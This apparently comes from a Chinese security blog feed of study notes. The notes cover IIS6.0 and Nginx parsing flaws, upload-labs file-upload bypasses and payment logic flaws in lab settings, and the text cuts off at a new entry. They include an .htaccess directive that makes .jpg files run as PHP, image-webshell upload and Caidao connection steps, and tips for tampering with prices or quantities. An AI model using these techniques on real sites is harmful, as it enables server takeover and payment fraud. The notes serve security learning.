        <content type="html"><![CDATA[<p><strong>接上一篇内容</strong></p><h2 id="IIS6-0解析漏洞（一）"><a href="#IIS6-0解析漏洞（一）" class="headerlink" title="IIS6.0解析漏洞（一）"></a>IIS6.0解析漏洞（一）</h2><p>我们现在要讲的第一个是IIS6.0的解析问题：</p><p>iis6.0除了将ASP后缀当成ASP进行解析的同时，当<strong>文件后缀名字为.asa .cer .cdx也会当做asp去解析</strong>，而严格意思上讲这可以说是iis6的一些特性，只是iis6默认的一些默认配置，文件后缀名字为.asa .cer .cdx之所以也会当做asp去解析，是因为<strong>IIS6.0在应用程序扩展中默认设置了.asa .cer .cdx都会调用asp.dll。</strong></p><p>当然，如果我们在iis6.0应用程序扩展配置中添加.allblue调用asp.dll可执行文件路径，那么我们也可以通过.allblue后缀来当成asp文件来解析；</p><p>接下来我们来看靶场：<br><img src="https://s2.ax1x.com/2019/05/23/VPPBQO.png" alt><br>这道题，我们只要通过上传一张图片马，并抓包将后缀改成.asa .cer .cdx其中一种后缀，都会被当成asp文件执行(请注意，我们要解析的是asp文件,所以一句话也要是asp的；也不能再本地直接改后缀名，因为这里会验证文件的文件类型)</p><p>我们将图片马上传并抓包改包<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bco51gejj30z40rkjup.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcotohhjj30z40rkwhz.jpg" alt><br>上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcp8pj9rj30kn06zmx7.jpg" alt><br>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcpms01qj31hc05374x.jpg" alt><br>通过菜刀文件连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcpzllsuj30zk0jgq4o.jpg" alt></p><h2 id="IIS6-0解析漏洞（二）"><a href="#IIS6-0解析漏洞（二）" class="headerlink" title="IIS6.0解析漏洞（二）"></a>IIS6.0解析漏洞（二）</h2><p>首先说明下,IIS5和IIS7.5无此漏洞！</p><p>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞，这一解析漏洞有两种完全不同的利用方式：</p><p>test.asp;.jpg 会被当做asp进行解析<br>text.asp/123.jpg 会被当做asp进行解析</p><p>假如我们请求/aaa.asp;xxxx.jpg<br> 执行过程：</p><ol><li><p>从头部查找查找“.”,获得.asp;xxxx.jpg</p></li><li><p>查找“;”号，如果有则内存截断</p></li><li><p>查找“/”号，如果有则内存截断</p></li></ol><p><strong>最终，将保留下来.asp字符串，从META_SCRIPT_MAP脚本映射表里于扩展名匹配对比，并反馈给asp.dll</strong><br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdy4uguij31320m9tbi.jpg" alt><br>我们先上传图片马<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdyhs8kfj30z40rkgoy.jpg" alt><br>并改包<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdysx2crj30z40rkq6a.jpg" alt><br>上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdz1tirij30d903nmx2.jpg" alt><br>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdzav54yj31h80600td.jpg" alt><br>通过菜刀文件连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdzl1189j30zk0jgwgd.jpg" alt></p><h2 id="IIS6-0解析漏洞（三）"><a href="#IIS6-0解析漏洞（三）" class="headerlink" title="IIS6.0解析漏洞（三）"></a>IIS6.0解析漏洞（三）</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bj36uy6oj312t0nigog.jpg" alt><br>IIS6.0还有一个漏洞，在后缀是.asp的文件夹下，里面的文件里只要有asp代码，只要进行访问，都会当做asp文件执行；<br>我们先上传图片看看目录：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bj3yblsnj31hb09ewet.jpg" alt><br>我发现他的文件是存放在.asp后缀文件夹下，那我们是不是可以上传一张图片马上去直接来当成asp文件执行呢？我们试下</p><p>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjbs3411j31f106nt8q.jpg" alt><br>访问成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bje86116j31h204mt9b.jpg" alt></p><p>直接用菜刀连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjepq8mqj30zk0jg75h.jpg" alt></p><h2 id="CGI解析漏洞"><a href="#CGI解析漏洞" class="headerlink" title="CGI解析漏洞"></a>CGI解析漏洞</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjhl75i1j312z0ms0vg.jpg" alt><br>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设SCRIPT_FILENAME.</p><p>当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置&quot;phpinfo.jpg/1.php&quot;,然后构造SCRIPT_FILENAME(绝对路径)传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置&quot;phpinfo.jpg/1.php&quot;,然后构造SCRIPT_FILENAME(绝对路径)传递给PHP</a> CGI，如果开启了fix_pathinfo选项，name就会触发在PHP中的如下逻辑：</p><p>PHP会认为SCRIPT_FILENAME(绝对路径)是phpinfo.jpg,而1.php是PATH_INFO,所以就会phpinfo.jpg作为php文件来解析了</p><p>这也是一个逻辑问题，所以说<strong>我们只需要在正常的jpg后面加/.php就可以成功的绕过解析</strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传解析漏洞-解析、验证、伪造</title>
      <link href="/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E4%BC%AA%E9%80%A0/"/>
      <url>/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞："><a href="#文件上传漏洞：" class="headerlink" title="文件上传漏洞："></a>文件上传漏洞：</h1><p>文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p><p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。</p><p>这里需要特别说明的是上传漏洞的利用经常会使用WebShell，而WebShell的植入远不止文件上传这一种方式。</p><h1 id="webshell："><a href="#webshell：" class="headerlink" title="webshell："></a>webshell：</h1><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p><h1 id="文件上传漏洞的原因："><a href="#文件上传漏洞的原因：" class="headerlink" title="文件上传漏洞的原因："></a>文件上传漏洞的原因：</h1><ul><li>文件上传时检查不严。没有进行文件格式检查。</li><li>文件上传后修改文件名时处理不当。一些应用在服务器端进行了完整的黑名单和白名单过滤，在修改已上传文件文件名时却百密一疏，允许用户修改文件后缀。如应用只能上传.doc文件时攻击者可以先将.php文件后缀修改为.doc，成功上传后在修改文件名时将后缀改回.php。</li></ul><h1 id="文件上传常见检测："><a href="#文件上传常见检测：" class="headerlink" title="文件上传常见检测："></a>文件上传常见检测：</h1><h3 id="1-客户端检测"><a href="#1-客户端检测" class="headerlink" title="1.客户端检测"></a>1.客户端检测</h3><p>一般都是在网页上写一段js脚本，通过js去检测上传文件的后缀名，有白名单形式也有黑名单形式。</p><p><strong>判断方式</strong>：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。前端验证非常不可靠，通过修改数据包后缀名就可以绕过，甚至关闭js都可以尝试绕过。</p><h3 id="2-服务端检测"><a href="#2-服务端检测" class="headerlink" title="2.服务端检测"></a>2.服务端检测</h3><p>检查content-type(内容类型)</p><p>检查后缀(多为检查后缀)</p><p>检查文件头</p><h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><p><strong>我们通过upload-labs这个靶场实践来进一步认识文件上传漏洞：</strong></p><h2 id="1-前端验证绕过"><a href="#1-前端验证绕过" class="headerlink" title="1.前端验证绕过"></a>1.前端验证绕过</h2><p>发现有一个上传点:<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/3Mmx5VPtCeDOVajrGQdlsIyRqbXkdDVByTBpXwvgJdA!/b/dE8BAAAAAAAA&amp;bo=JAWAAn4HpQMDCVA!&amp;rf=viewer_4" alt></p><p>我们试着上传一个带一句话的php上去，并开启burp抓包：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/l.JY9E.mj4AfwMwYb5Dctfcfw9EOUQbMT0Z.zi4J4go!/b/dL8AAAAAAAAA&amp;bo=ZQaAAnwGiQIDGSw!&amp;rf=viewer_4" alt><br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/uTXBzs2Ps5cWXXSqyuT6tJycypL.Z6kJ*kCngBftG6s!/b/dDUBAAAAAAAA&amp;bo=8ATgA*AE4AMDGTw!&amp;rf=viewer_4" alt><br>发现被拦截下来，提示只能上传图片类型，而在burp上并无抓取到任何数据，这证明就是一个典型的客户端前端检测</p><p>我们通过将php文件改成jpg文件使其符合检测要求，再在抓取数据包时将文件后缀改回php，从而完成绕过：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/TTZRCftxc3JNuulzU7WceTsyeEqqCQOokzNoepwq*XA!/b/dL4AAAAAAAAA&amp;bo=8ATgA*AE4AMDGTw!&amp;rf=viewer_4" alt></p><p>发现成功上传<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/*EDL2ABep5jCTnuEtx3hbs3zd7SZRFPJR3GKoldj5xc!/b/dLYAAAAAAAAA&amp;bo=gAcyAoAHMgIDGTw!&amp;rf=viewer_4" alt></p><p>通过连接菜刀或直接调用一句话函数都可以实现了getshell；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/4TFYbPyRNP5*fBz2AFQw*IZxJcvcViw.uVEx9OrYYt8!/b/dIMAAAAAAAAA&amp;bo=XQfVA10H1QMDGTw!&amp;rf=viewer_4" alt></p><h2 id="2-Content-Type方式绕过"><a href="#2-Content-Type方式绕过" class="headerlink" title="2.Content-Type方式绕过"></a>2.Content-Type方式绕过</h2><p>分析源码，知道了是对Content-Type(内容类型)和文件头的检测，<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/k7Q*x9fqgWz5dGtJqOsWKzPvTT0idkTpvc1k9nKHPLs!/b/dLgAAAAAAAAA&amp;bo=BgWAAmUHrgMRGWA!&amp;rf=viewer_4" alt></p><p>那我们想到的是就是图片马，图片马是可以很好的绕过内容类型和文件头检测的，在这里我准备好了一个写了一句话的txt文件和一张小图片来合成一张图片马：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/gz4TwdZE01nQdK7U6tdbyqa9xidrPgWSev6j8jC5.jM!/b/dFMBAAAAAAAA&amp;bo=zADaAMwA2gARGS4!&amp;rf=viewer_4" alt><br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/OJ0mpZH4z1GBmvVyPYgtUiengE6r*78DPKn.ynq4WTc!/b/dMUAAAAAAAAA&amp;bo=nQI*AZ0CPwERGS4!&amp;rf=viewer_4" alt><br>成功生成图片马，然后我们将图片马上传并抓包将后缀改为php，因为web容器是根据后缀去解析不同的文件的，所以我们将他改成php<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/dUa5qe571hvX4y8kSTfD*rEs.jxaziSx8mmE0Yo.9sI!/b/dIQAAAAAAAAA&amp;bo=8ATgA*AE4AMRGS4!&amp;rf=viewer_4" alt><br>最后成功上传，并调用一句话<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/8Temr59hWbfKnh6OUyr0dRh3UCato6TZFcWnUChSbHM!/b/dL8AAAAAAAAA&amp;bo=MQWAAmgHkQMRGWU!&amp;rf=viewer_4" alt><br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ZO3Z5LqU7MPUKOuIRhqiYTwnCmkpNEaHxm1U*T3d1.o!/b/dDQBAAAAAAAA&amp;bo=dAfXA3QH1wMRCT4!&amp;rf=viewer_4" alt></p><h2 id="3-黑名单绕过"><a href="#3-黑名单绕过" class="headerlink" title="3.黑名单绕过"></a>3.黑名单绕过</h2><p>查看源码<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/Nb6czO9WTB4*L6e6mQuqQ7Agi.ex2aNHMb*tv6W2SgM!/b/dLYAAAAAAAAA&amp;bo=ZQW9AmUFvQIRCT4!&amp;rf=viewer_4" alt><br>发现是一个黑名单绕过，它拦截了.asp,.aspx,.php,.jsp后缀的文件，但他拦截了php，是不是就意味着我们就不能上传php文件了呢？其实不是的，在默认状态下<strong>php，php3，php4，php5，phtml</strong>是会被解析成php的，请看下图<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ekwZbyk2edL5EupB09P8Jmdsc2QvPzfargMfRfWj03U!/b/dMAAAAAAAAAA&amp;bo=LgGkAC4BpAARCT4!&amp;rf=viewer_4" alt><br>我们将图片马后缀改成php3，成功将上传，调用一句话，最后成功调用，证明是可以php3是可以被php解析的；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/ER3vfEB2o6Cz20fHXHQSnQVYaezJOBDlDhVPMMSlH4o!/b/dL8AAAAAAAAA&amp;bo=ewfSA3sH0gMRGS4!&amp;rf=viewer_4" alt></p><h2 id="4-htaccess文件绕过"><a href="#4-htaccess文件绕过" class="headerlink" title="4. .htaccess文件绕过"></a>4. .htaccess文件绕过</h2><p><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/mEWjMDZU2Q7YDuklJEEfcKIcukqlBjU8U*FNNsBltTw!/b/dDIBAAAAAAAA&amp;bo=VAXJAlQFyQIRGS4!&amp;rf=viewer_4" alt><br>.htaccess是什么？.htaccess文件也被称为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或者多个指令的文件，以作用于此目录及其所有子目录。<br>.htaccess功能：<br>文件密码保护，用户自定义重定向，自定义404页面，扩展名伪静态化，禁止特定ip地址的用户，但这个功能默认是不开启的。</p><p>.htaccess中有一条指令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>这个指令代表着.jpg文件会当做php来解析。</p><p>只要我们把带有这条指令的.htaccess配置文件上传上去到有黑名单拦截的上传点，那就意味着我们就能将图片马直接上传上去了！</p><p>图形化界面是不允许我们将文件命名为空文件名 .htaccess，所以这里通过cmd命令来进行重命名：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/*Z8xWXTZLwkgcga9IhymWx*oWoG6MnmR9M.DajlIFl8!/b/dE0BAAAAAAAA&amp;bo=WwTQAlsE0AIRGS4!&amp;rf=viewer_4" alt><br>成功命名，<br>我们接下来，只需要先将.htaccess配置文件先传上去，在将图片马传上去即可；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/QjmHLIRy7nOP*i6x2BoPnYS58mG3WipMkEMJnsztUyk!/b/dLYAAAAAAAAA&amp;bo=gAfcA4AH3AMRGS4!&amp;rf=viewer_4" alt></p><h2 id="5-后缀大小写绕过"><a href="#5-后缀大小写绕过" class="headerlink" title="5.后缀大小写绕过"></a>5.后缀大小写绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/NsiHDYDfN.Hj.9yD1bRwXVg.UMyHnH6x.WU0p0PPKtY!/b/dFMBAAAAAAAA&amp;bo=YAXIAmAFyAIRCT4!&amp;rf=viewer_4" alt></p><p>在这里，虽然使用了很多过滤，过滤了很多文件类型，但却没将文件后缀统一转化为小写，所以我们是能通过后缀大小写来绕过上传的：</p><p><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/yOlNuyZEw.zicCi8Edmbs5BKc1fH.HnwoPjmqQwes4Q!/b/dFMBAAAAAAAA&amp;bo=ZwCCAGcAggARGS4!&amp;rf=viewer_4" alt></p><p>我们将做成图片马直接将后缀改成Php，进行上传<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/kvso.KNy1R2IDA9JC.lM4CZqaR4Py5qhwuvutwnx8ME!/b/dE8BAAAAAAAA&amp;bo=gAfZA4AH2QMRGS4!&amp;rf=viewer_4" alt></p><h2 id="6-文件后缀（空）绕过"><a href="#6-文件后缀（空）绕过" class="headerlink" title="6.文件后缀（空）绕过"></a>6.文件后缀（空）绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ctpzNLW1hvfPIv.T4z0Dkrsak5SyY67FtTJu8nlEkzQ!/b/dDQBAAAAAAAA&amp;bo=ZwXFAmcFxQIRCT4!&amp;rf=viewer_4" alt></p><p>这里相对于前面关卡的代码是少了一个消除两旁空格的函数trim();所以我们我们可以通过在后缀加个空格尝试绕过，<strong>黑名单机制中，是不允许上传什么，但如果我们传上去的文件与所限制的稍有不一样，那是不是就可以直接绕过黑名单了</strong></p><p>我们进行将带有一句话的php文件上传并抓包</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/d*pCj2unPGzQ7rMhKzo8QEfPa7tBLtExl229Qs*79HE!/b/dL4AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt></p><p>在后缀加个空格，上传</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/kvso.KNy1R2IDA9JC.lM4CZqaR4Py5qhwuvutwnx8ME!/b/dE8BAAAAAAAA&amp;bo=gAfZA4AH2QMRCT4!&amp;rf=viewer_4" alt></p><h2 id="7-文件后缀-点-绕过"><a href="#7-文件后缀-点-绕过" class="headerlink" title="7.文件后缀(点)绕过"></a>7.文件后缀(点)绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/m1IqTO83xMSNLK8m2qvEU8CwZUTsqPY3GoAIPB1aFdY!/b/dL8AAAAAAAAA&amp;bo=CQWAAmAFqwIRCXw!&amp;rf=viewer_4" alt><br>这里是少了一个删除末尾的点的函数</p><p>我们还是进行将带有一句话的php文件上传并抓包</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/qiENQR89aUzEeuVUhohrosTDte9YlnwFnZr1bGrfjko!/b/dL8AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt><br>在后缀加个点，上传，在上传到服务器后，服务器会自动将点去掉，只读取前面有用的后缀；<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/synsgTwLVgNk6k9.rkhjouhz5iuujzkRNdYZALQkaCg!/b/dDcBAAAAAAAA&amp;bo=gAfbA4AH2wMRCT4!&amp;rf=viewer_4" alt></p><h2 id="8-DATA（Windows文件流绕过）"><a href="#8-DATA（Windows文件流绕过）" class="headerlink" title="8.::$DATA（Windows文件流绕过）"></a>8.::$DATA（Windows文件流绕过）</h2><p>::$DATA（Windows文件流绕过）（这里利用到了NTFS交换数据流(ADS)，ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都存在许多个数据流。通俗理解，就是其他文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿问文件。）</p><p>例如在cmd命令下运行：echo abcd&gt;&gt;a.txt:b.txt 很明显生成一个a.txt，但是会是空值，因为系统将值写到寄宿文件上去了；</p><p>然后再运行 echo 123&gt;&gt;a.txt::$DATA，是会在a.txt中输出123的，因为<br>::$DATA相当是个空值，不是一个寄宿文件，所以还是会将文件写入到a.txt中去，不修改文件存储过程；</p><p>在利用Windows特性，可在后缀加上“ ::$DATA ”绕过。<br>跟之前一样的思路，抓包改包绕过。<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ZxgolmKjvTPXMgVANvNagukSCz3aQqzZw.zzqXbcpS4!/b/dEgBAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt></p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/.jYmXUYDdeLg0syadDStJOYrClaPTtwNCJ92IdU5zYs!/b/dLYAAAAAAAAA&amp;bo=fgfSA34H0gMRCT4!&amp;rf=viewer_4" alt></p><h2 id="9-构造文件后缀绕过"><a href="#9-构造文件后缀绕过" class="headerlink" title="9.构造文件后缀绕过"></a>9.构造文件后缀绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/u0nPUSpkCll3GfBBIDmRopaaxgVdUrxPl0kX1o15lXo!/b/dMAAAAAAAAAA&amp;bo=awXNAmsFzQIRCT4!&amp;rf=viewer_4" alt><br>第九关好像用了我们前面关卡的所有过滤，那我们可不可以构造一个文件名后缀111.php. . 过滤参数在发现.时会将.去掉，在将空格去掉，最后只剩下111.php. 这样还是可以绕过黑名单机制的，因为111.php.不等于111.php，所以还是能绕过上传；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/b3gpzQ8zgA4BwI3BdF4*1rxQ4lONy3af9pXegTyO3Gg!/b/dLgAAAAAAAAA&amp;bo=8ATgA*AE4AMRGS4!&amp;rf=viewer_4" alt></p><h2 id="10双写文件后缀绕过"><a href="#10双写文件后缀绕过" class="headerlink" title="10双写文件后缀绕过"></a>10双写文件后缀绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ypZhRcfDvAhSB.SfJLlAWG2DK8tmHOECM2ZWrfGyWtU!/b/dIQAAAAAAAAA&amp;bo=agUEAmoFBAIRCT4!&amp;rf=viewer_4" alt></p><p>会将符合条件的文件后缀删除，我们只需要将文件后缀进行双写，令他删除后合并就能成功绕过！</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/4OigHcJUMtz6dSWTiGju0oMns0AxY1eM0u*O.o.QG7E!/b/dL8AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt><br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/LG5JK1ZorQZBrglBO1UAbGKez.B5lgA3DPErpWLP77M!/b/dDcBAAAAAAAA&amp;bo=cgfWA3IH1gMRCT4!&amp;rf=viewer_4" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>支付漏洞</title>
      <link href="/2019/12/07/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="快捷支付原理"><a href="#快捷支付原理" class="headerlink" title="快捷支付原理"></a>快捷支付原理</h2><p>商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知</p><h3 id="浏览器跳转"><a href="#浏览器跳转" class="headerlink" title="浏览器跳转"></a>浏览器跳转</h3><p>基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性</p><h3 id="服务端异步通知"><a href="#服务端异步通知" class="headerlink" title="服务端异步通知"></a>服务端异步通知</h3><p>该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用post或get的方式。商户网站接受异步参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额，订单信息是否与发起支付时一致，验证正常则对定单进行状态处理或为用户进行网站内入账等。</p><p>该漏洞属于逻辑漏洞的一种，需要靠不一样的思维，来进行逻辑绕过。</p><p>##常见支付漏洞<br>支付步骤：————订购、订单、付款</p><p>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可以在最后一步富矿石进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p><ul><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0112258.html" target="_blank" rel="noopener">修改支付金额案例</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0102292.html" target="_blank" rel="noopener">修改支付状态案例</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0108134.html" target="_blank" rel="noopener">修改订单数量案例</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0139556.html" target="_blank" rel="noopener">修改附属值案例</a></p></li></ul><p>优惠券其基本都是优惠一半，一般用优惠券进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</p><p>越权支付<br>存在user=id(123)，这种传参时，尝试改id，尝试用别人的钱包买自己的物品</p><p><a href="http://www.anquan.us/static/bugs/wooyun-2016-0188155.html" target="_blank" rel="noopener">无限制试用案例</a><br>比如试用的参数为2，正常购买的参数为1<br>那么我们购买参数为2(试用)，会发生什么呢？</p><h2 id="支付漏洞-挖掘"><a href="#支付漏洞-挖掘" class="headerlink" title="支付漏洞(挖掘)"></a>支付漏洞(挖掘)</h2><ul><li><strong>找到关键的数据包</strong><br>可能支付操作有三四个数据包，我们要对数据进行挑选。</li><li><strong>分析数据包</strong><br>支付数据包中会包含很多的敏感信息(账号，金额，余额，优惠)，要擦尝试对数据包中的各个参数进行分析</li><li><strong>不按套路出牌</strong><br>多去想想开发想不到的地方<br>pc端尝试过，wap端也看看，app也试试</li></ul><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1、后端检查每一项值，包括支付状态。</p><p>2、校验价格、数量参数，比如产品数量只能为整数，并限制购买数量</p><p>3、与第三方支付平台检查，实际支付的金额是否与订单一致。</p><p>4、对支付参数进行MD5加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题</p><p>5、金额超过一定值，进行人工审核</p><p>6、限制用户对商品的支付次数</p><h2 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h2><p>找到了一个很辣眼睛的CMS<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uujelhkej31h90p8gud.jpg" alt><br>我们先进行注册用户<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uujv998nj31h90ilwkt.jpg" alt><br>我们点击商品中心<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uuk97z1bj31hc0oa10b.jpg" alt><br>发现他的购买数量没进行限制，还可以填入负数，这就连传包的力气都省… 那我们填入-10000试试<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uukm40dfj31ha0o9qa7.jpg" alt><br>提交<br> 发现报错<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uullzk2dj31gt0q0q5j.jpg" alt><br>我们先不管，先返回看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uul2tmojj31hc0nuq9d.jpg" alt><br>我们发现我账户余额多了92000块</p><hr><p>我搜到一篇文章，我觉得总结的挺好的，推荐一下：<a href="https://secpulse.com/archives/67080.html" target="_blank" rel="noopener">挖洞技巧：支付漏洞之总结</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>平行越权、垂直越权</title>
      <link href="/2019/12/07/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E3%80%81%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
      <url>/2019/12/07/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E3%80%81%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="越权漏洞描述"><a href="#越权漏洞描述" class="headerlink" 